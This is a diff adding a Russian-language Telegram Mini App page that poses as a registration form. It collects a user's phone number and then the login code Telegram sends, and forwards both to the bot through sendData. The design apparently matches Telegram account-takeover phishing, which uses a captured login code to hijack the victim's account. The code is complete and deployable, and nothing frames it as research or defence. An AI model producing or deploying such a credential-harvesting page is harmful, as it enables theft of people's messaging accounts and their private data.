@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org"></script>
+    <style>
+        body { font-family: sans-serif; background: var(--tg-theme-bg-color); color: var(--tg-theme-text-color); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 90%; text-align: center; }
+        input { width: 80%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ccc; font-size: 16px; }
+        button { width: 85%; padding: 12px; border-radius: 10px; border: none; background: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color); font-weight: bold; cursor: pointer; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container" id="phone-step">
+        <h2>Регистрация</h2>
+        <p>Введите номер телефона</p>
+        <input type="tel" id="phone" placeholder="+79991234567">
+        <button onclick="sendPhone()">Продолжить</button>
+    </div>
+
+    <div class="container hidden" id="code-step">
+        <h2>Подтверждение</h2>
+        <p>Введите код из Telegram</p>
+        <input type="number" id="code" placeholder="12345">
+        <button onclick="sendCode()">Войти</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            if(phone) {
+                tg.sendData("phone:" + phone); // Отправляем префикс, чтобы бот понял
+                document.getElementById('phone-step').classList.add('hidden');
+                document.getElementById('code-step').classList.remove('hidden');
+            }
+        }
+
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            if(code) {
+                tg.sendData("code:" + code);
+                tg.close(); // Закрываем приложение после отправки кода
+            }
+        }
+    </script>
+</body>
+</html>
